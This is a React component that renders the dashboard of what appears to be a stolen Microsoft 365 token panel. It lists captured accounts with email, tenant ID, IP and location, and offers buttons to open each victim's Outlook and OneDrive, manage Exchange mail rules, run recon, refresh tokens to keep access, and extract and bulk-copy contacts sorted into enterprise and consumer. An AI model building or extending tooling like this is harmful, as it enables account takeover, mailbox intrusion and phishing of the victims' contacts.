"use client";

import { useState, useMemo } from "react";
import { motion, AnimatePresence } from "framer-motion";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Badge } from "@/components/ui/badge";
import {
  Search,
  RefreshCw,
  Mail,
  Globe,
  HardDrive,
  Users,
  ExternalLink,
  Clock,
  MapPin,
  Building2,
  Wifi,
  CheckCircle2,
  XCircle,
  AlertCircle,
  Gavel,
  ChevronLeft,
  ChevronRight,
} from "lucide-react";
import { Token } from "@/types/token";
import { formatDistanceToNow, isPast } from "date-fns";
import { deleteTokens, refreshToken, extractEmails } from "@/lib/api";
import { useRouter } from "next/navigation";
import { toast } from "sonner";
import { TokenTableSkeleton } from "@/components/ui/loading-skeleton";

interface TokenTableProps {
  tokens: Token[];
  loading: boolean;
  onRefresh: () => void;
  lastUpdated: Date | null;
}

export function TokenTable({ tokens, loading, onRefresh, lastUpdated }: TokenTableProps) {
  const router = useRouter();
  const [search, setSearch] = useState("");
  const [refreshingId, setRefreshingId] = useState<string | null>(null);
  const [hoveredId, setHoveredId] = useState<string | null>(null);
  const [actionLoadingId, setActionLoadingId] = useState<string | null>(null);
  const [actionLoadingType, setActionLoadingType] = useState<string | null>(null);
  const [contactsOpen, setContactsOpen] = useState(false);
  const [contactsLoading, setContactsLoading] = useState(false);
  const [extractedContacts, setExtractedContacts] = useState<any[]>([]);
  const [contactsFilter, setContactsFilter] = useState<"all" | "enterprise" | "consumer">("all");
  const [currentPage, setCurrentPage] = useState(1);
  const TOKENS_PER_PAGE = 25;

  const filtered = useMemo(() => {
    if (!search) return tokens;
    const q = search.toLowerCase();
    return tokens.filter(
      (t) =>
        t.email?.toLowerCase().includes(q) ||
        t.location?.toLowerCase().includes(q) ||
        t.tenant_id?.toLowerCase().includes(q) ||
        t.ip_address?.toLowerCase().includes(q)
    );
  }, [tokens, search]);

  const totalPages = Math.ceil(filtered.length / TOKENS_PER_PAGE);
  const paginatedTokens = useMemo(() => {
    const start = (currentPage - 1) * TOKENS_PER_PAGE;
    return filtered.slice(start, start + TOKENS_PER_PAGE);
  }, [filtered, currentPage]);

  // Reset to page 1 when search changes
  useMemo(() => {
    setCurrentPage(1);
  }, [search]);

  const activeCount = tokens.filter((t) => !isPast(new Date(t.expires_at))).length;
  const revokedCount = tokens.filter((t) => isPast(new Date(t.expires_at))).length;

  const handleExtractContacts = async (token: Token) => {
    setActionLoadingId(token.id);
    setActionLoadingType("contacts");
    setContactsLoading(true);
    try {
      const result = await extractEmails(token.id);
      setExtractedContacts(result.emails || []);
      setContactsOpen(true);
      toast.success(`Extracted ${result.count} contacts`);
    } catch (e: any) {
      toast.error("Failed to extract contacts", { description: e.message });
    } finally {
      setContactsLoading(false);
      setActionLoadingId(null);
      setActionLoadingType(null);
    }
  };

  const handleRefresh = async (token: Token) => {
    setActionLoadingId(token.id);
    setActionLoadingType("refresh");
    try {
      const result = await refreshToken(token.id);
      if (result.success) {
        toast.success("Token refreshed");
        onRefresh();
      } else {
        toast.error("Refresh failed", { description: result.message });
      }
    } catch (e: any) {
      toast.error("Error", { description: e.message });
    } finally {
      setActionLoadingId(null);
      setActionLoadingType(null);
    }
  };



  const openApp = (token: Token, app: string) => {
    const base = `/outlook/${token.id}`;
    switch (app) {
      case "OUTLOOK":
        router.push(base);
        break;
      case "ONEDRIVE":
        // Open OneDrive view within our dashboard using the token
        router.push(`${base}?view=onedrive`);
        break;
      case "TEAMS":
        // Open Teams in a new tab (Teams requires special handling)
        window.open(`https://teams.microsoft.com`, "_blank");
        break;
      case "ADMIN":
        router.push(`/recon/${token.id}`);
        break;
      case "EXCHANGE":
        // Open Exchange admin center (mail flow rules) within our dashboard
        router.push(`/rules/${token.id}`);
        break;
      case "WORD":
        // Open Office apps view within our dashboard
        router.push(`${base}?view=office&app=word`);
        break;
      case "EXCEL":
        router.push(`${base}?view=office&app=excel`);
        break;
      case "POWERPOINT":
        router.push(`${base}?view=office&app=powerpoint`);
        break;
    }
  };

  const getStatus = (token: Token) => {
    // Check explicit status from database first (set by scheduler when token is revoked)
    if (token.status === "revoked" || token.status === "expired") return "revoked";
    if (token.session_status === "expired" || token.session_status === "killed") return "revoked";
    // Also check if token has expired
    if (isPast(new Date(token.expires_at))) return "revoked";
    return "active";
  };



  const getRefreshedText = (token: Token) => {
    if (token.last_refreshed_at) {
      return `Refreshed ${formatDistanceToNow(new Date(token.last_refreshed_at))} ago`;
    }
    if (token.created_at) {
      return `Refreshed ${formatDistanceToNow(new Date(token.created_at))} ago`;
    }
    return "Refreshed recently";
  };

  return (
    <div className="space-y-4">
      {/* Header Stats */}
      <div className="flex items-center justify-between">
        <div className="flex items-center gap-2">
          <span className="text-2xl font-bold tracking-tight">PRIVATE TOKEN</span>
          <Badge variant="outline" className="bg-emerald-500/10 text-emerald-400 border-emerald-500/20">
            {activeCount} active
          </Badge>
          <Badge variant="outline" className="bg-rose-500/10 text-rose-400 border-rose-500/20">
            {revokedCount} revoked
          </Badge>
          <div className="flex items-center gap-1 text-[11px] text-muted-foreground">
            <div className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse" />
            just now
          </div>
        </div>
        <div className="flex items-center gap-3">
          <div className="relative">
            <Search className="absolute left-3 top-1/2 h-4 w-4 -translate-y-1/2 text-muted-foreground" />
            <Input
              placeholder="Search by email, tenant..."
              value={search}
              onChange={(e) => setSearch(e.target.value)}
              className="pl-9 w-72 bg-secondary/50 border-white/5"
            />
          </div>
          <Button
            variant="outline"
            size="sm"
            onClick={onRefresh}
            disabled={loading}
            className="gap-1.5 border-white/10 bg-secondary/50"
          >
            <RefreshCw className={`h-3.5 w-3.5 ${loading ? "animate-spin" : ""}`} />
            Refresh
          </Button>
        </div>
      </div>

      {/* Token Rows */}
      <div className="space-y-2">
        <AnimatePresence>
          {loading && tokens.length === 0 ? (
            <TokenTableSkeleton rows={5} />
          ) : filtered.length === 0 ? (
            <div className="flex flex-col items-center justify-center py-20 text-muted-foreground">
              <AlertCircle className="h-12 w-12 mb-4 opacity-30" />
              <p className="text-sm">No tokens found</p>
            </div>
          ) : (
            paginatedTokens.map((token, index) => {
              const status = getStatus(token);
              const isActive = status === "active";

              return (
                <motion.div
                  key={token.id}
                  initial={{ opacity: 0, y: 10 }}
                  animate={{ opacity: 1, y: 0 }}
                  exit={{ opacity: 0, scale: 0.95 }}
                  transition={{ delay: index * 0.05, duration: 0.2 }}
                  className="group rounded-xl border border-white/5 bg-[#0f0f23]/80 hover:bg-[#1a1a3e]/80 transition-all duration-300 p-4"
                  onMouseEnter={() => setHoveredId(token.id)}
                  onMouseLeave={() => setHoveredId(null)}
                >
                  {/* Collapsible Row Content */}
                  <div className="flex items-start justify-between gap-4">
                    <div className="flex-1 min-w-0">
                      {/* Email & Status */}
                      <div className="flex items-center gap-2 mb-1">
                        <h3 className="text-sm font-semibold text-white truncate">
                          {token.email}
                        </h3>
                        {isActive ? (
                          <Badge className="bg-emerald-500/20 text-emerald-400 border-emerald-500/30 text-[10px] px-2 py-0">
                            <CheckCircle2 className="h-3 w-3 mr-1" />
                            ACTIVE
                          </Badge>
                        ) : (
                          <Badge className="bg-rose-500/20 text-rose-400 border-rose-500/30 text-[10px] px-2 py-0">
                            <XCircle className="h-3 w-3 mr-1" />
                            REVOKED
                          </Badge>
                        )}
                      </div>
                      
                      {/* Collapsed view: only show meta info */}
                      <div className="flex flex-wrap items-center gap-x-3 gap-y-1 text-[11px] text-muted-foreground">
                        {token.tenant_id && (
                          <span className="flex items-center gap-1">
                            <Building2 className="h-3 w-3" />
                            {token.tenant_id}
                          </span>
                        )}
                        {token.ip_address && (
                          <span className="flex items-center gap-1">
                            <Wifi className="h-3 w-3" />
                            {token.ip_address}
                          </span>
                        )}
                        {token.location && (
                          <span className="flex items-center gap-1">
                            <MapPin className="h-3 w-3" />
                            {token.location}
                          </span>
                        )}
                        <span className="flex items-center gap-1">
                          <Clock className="h-3 w-3" />
                          {token.created_at ? formatDistanceToNow(new Date(token.created_at), { addSuffix: true }) : "unknown"}
                        </span>
                      </div>

                      {/* Expanded view: show more details and buttons */}
                      {(index === 0 || hoveredId === token.id) && (
                        <>
                          {/* Refreshed ago */}
                          <p className="text-[11px] text-muted-foreground mt-2 mb-2">
                            {getRefreshedText(token)}
                          </p>

                          {/* Functional App Buttons Only */}
                          <div className="flex flex-wrap gap-1.5 mb-3">
                            {[
                              { name: "ONEDRIVE", color: "bg-blue-500/20 text-blue-400 border-blue-500/30" },
                              { name: "EXCHANGE", color: "bg-cyan-500/20 text-cyan-400 border-cyan-500/30" },
                            ].map((app) => (
                              <button
                                key={app.name}
                                onClick={() => openApp(token, app.name)}
                                className={`inline-flex items-center gap-1 px-2.5 py-1 rounded-md text-[10px] font-medium border ${app.color} hover:opacity-80 transition-opacity`}
                              >
                                {app.name}
                              </button>
                            ))}
                            <button
                              onClick={() => handleExtractContacts(token)}
                              disabled={contactsLoading}
                              className="inline-flex items-center gap-1 px-2.5 py-1 rounded-md text-[10px] font-medium border bg-purple-500/20 text-purple-400 border-purple-500/30 hover:opacity-80 transition-opacity disabled:opacity-50"
                            >
                              {contactsLoading && actionLoadingId === token.id ? (
                                <RefreshCw className="h-3 w-3 animate-spin" />
                              ) : (
                                <Users className="h-3 w-3" />
                              )}
                              Contacts
                            </button>
                          </div>
                        </>
                      )}
                    </div>

                    {/* Actions */}
                    <div className="flex items-center gap-2 shrink-0">
                      <button
                        onClick={() => openApp(token, "OUTLOOK")}
                        disabled={actionLoadingId === token.id && actionLoadingType === "outlook"}
                        className="inline-flex items-center gap-1.5 px-4 py-2 rounded-lg bg-[#0078d4]/20 text-[#0078d4] border border-[#0078d4]/30 text-xs font-medium hover:bg-[#0078d4]/30 transition-colors disabled:opacity-50"
                      >
                        {actionLoadingId === token.id && actionLoadingType === "outlook" ? (
                          <RefreshCw className="h-3.5 w-3.5 animate-spin" />
                        ) : (
                          <ExternalLink className="h-3.5 w-3.5" />
                        )}
                        OUTLOOK
                      </button>
                      
                      <button
                        onClick={() => router.push(`/rules/${token.id}`)}
                        disabled={actionLoadingId === token.id && actionLoadingType === "rules"}
                        className="inline-flex items-center gap-1.5 px-3 py-2 rounded-lg bg-amber-500/10 text-amber-400 border border-amber-500/20 text-xs font-medium hover:bg-amber-500/20 transition-colors disabled:opacity-50"
                        title="Manage rules"
                      >
                        {actionLoadingId === token.id && actionLoadingType === "rules" ? (
                          <RefreshCw className="h-3.5 w-3.5 animate-spin" />
                        ) : (
                          <Gavel className="h-3.5 w-3.5" />
                        )}
                        Rules
                      </button>
                      
                      <button
                        onClick={() => handleRefresh(token)}
                        disabled={actionLoadingId === token.id && actionLoadingType === "refresh"}
                        className="p-2 rounded-lg border border-white/10 hover:bg-white/5 transition-colors disabled:opacity-50"
                        title="Refresh token"
                      >
                        <RefreshCw className={`h-4 w-4 text-emerald-400 ${actionLoadingId === token.id && actionLoadingType === "refresh" ? "animate-spin" : ""}`} />
                      </button>
                      
                      <button
                        onClick={() => {
                          if (confirm("Delete this token?")) {
                            deleteTokens([token.id])
                              .then(() => {
                                toast.success("Token deleted");
                                onRefresh();
                              })
                              .catch((e: any) => {
                                toast.error("Delete failed", { description: e.message || "Unknown error" });
                              });
                          }
                        }}
                        className="p-2 rounded-lg border border-white/10 hover:bg-rose-500/10 transition-colors"
                        title="Delete token"
                      >
                        <XCircle className="h-4 w-4 text-rose-400" />
                      </button>
                    </div>
                  </div>
                </motion.div>
              );
            })
          )}
        </AnimatePresence>
      </div>

      {/* Pagination Controls */}
      <div className="flex items-center justify-center gap-4 mt-4">
        {totalPages > 1 && (
          <Button
            variant="outline"
            size="sm"
            onClick={() => setCurrentPage((p) => Math.max(1, p - 1))}
            disabled={currentPage === 1}
            className="gap-1 border-white/10 bg-secondary/50"
          >
            <ChevronLeft className="h-4 w-4" /> Previous
          </Button>
        )}
        <span className="text-sm text-muted-foreground">
          {totalPages > 1 ? `Page ${currentPage} of ${totalPages} (${filtered.length} total)` : `Showing ${filtered.length} token${filtered.length !== 1 ? 's' : ''}`}
        </span>
        {totalPages > 1 && (
          <Button
            variant="outline"
            size="sm"
            onClick={() => setCurrentPage((p) => Math.min(totalPages, p + 1))}
            disabled={currentPage === totalPages}
            className="gap-1 border-white/10 bg-secondary/50"
          >
            Next <ChevronRight className="h-4 w-4" />
          </Button>
        )}
      </div>

      {/* Contacts Modal */}
      {contactsOpen && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/50 p-4">
          <div className="bg-[#1a1a2e] border border-white/10 rounded-xl w-full max-w-2xl max-h-[80vh] flex flex-col">
            <div className="flex items-center justify-between p-4 border-b border-white/10">
              <h3 className="text-lg font-semibold">Extracted Contacts ({extractedContacts.length})</h3>
              <button onClick={() => setContactsOpen(false)} className="p-1 hover:bg-white/10 rounded">
                <XCircle className="h-5 w-5" />
              </button>
            </div>
            <div className="flex items-center gap-2 p-4 border-b border-white/10">
              <div className="flex gap-1">
                {(["all", "enterprise", "consumer"] as const).map((f) => (
                  <button
                    key={f}
                    onClick={() => setContactsFilter(f)}
                    className={`px-3 py-1 rounded-md text-xs font-medium border transition-colors ${
                      contactsFilter === f
                        ? "bg-[#0078d4]/20 text-[#0078d4] border-[#0078d4]/30"
                        : "bg-white/5 text-muted-foreground border-white/10 hover:bg-white/10"
                    }`}
                  >
                    {f.charAt(0).toUpperCase() + f.slice(1)}
                  </button>
                ))}
              </div>
              <div className="flex-1" />
              <button
                onClick={() => {
                  const filtered = contactsFilter === "all"
                    ? extractedContacts
                    : extractedContacts.filter((c) => c.type === contactsFilter);
                  const emails = filtered.map((c) => c.email).join("\n");
                  navigator.clipboard.writeText(emails);
                  toast.success(`${filtered.length} emails copied to clipboard`);
                }}
                className="px-3 py-1.5 rounded-md text-xs font-medium bg-emerald-500/20 text-emerald-400 border border-emerald-500/30 hover:bg-emerald-500/30 transition-colors"
              >
                Copy All
              </button>
            </div>
            <div className="flex-1 overflow-auto p-4 space-y-2">
              {(contactsFilter === "all"
                ? extractedContacts
                : extractedContacts.filter((c) => c.type === contactsFilter)
              ).map((contact, i) => (
                <div key={i} className="flex items-center justify-between p-2 rounded-lg bg-white/5 border border-white/5">
                  <div className="flex items-center gap-2">
                    <span className="text-xs text-muted-foreground w-6">{i + 1}</span>
                    <div>
                      <p className="text-sm font-medium">{contact.name}</p>
                      <p className="text-xs text-muted-foreground">{contact.email}</p>
                    </div>
                  </div>
                  <Badge className={`text-[10px] ${
                    contact.type === "enterprise" ? "bg-blue-500/20 text-blue-400" :
                    contact.type === "consumer" ? "bg-purple-500/20 text-purple-400" :
                    "bg-gray-500/20 text-gray-400"
                  }`}>
                    {contact.type}
                  </Badge>
                </div>
              ))}
            </div>
          </div>
        </div>
      )}

      {/* Polling indicator */}
      {lastUpdated && (
        <p className="text-[10px] text-muted-foreground text-center">
          Polling every 10s — Last updated {formatDistanceToNow(lastUpdated, { addSuffix: true })}
        </p>
      )}
    </div>
  );
}
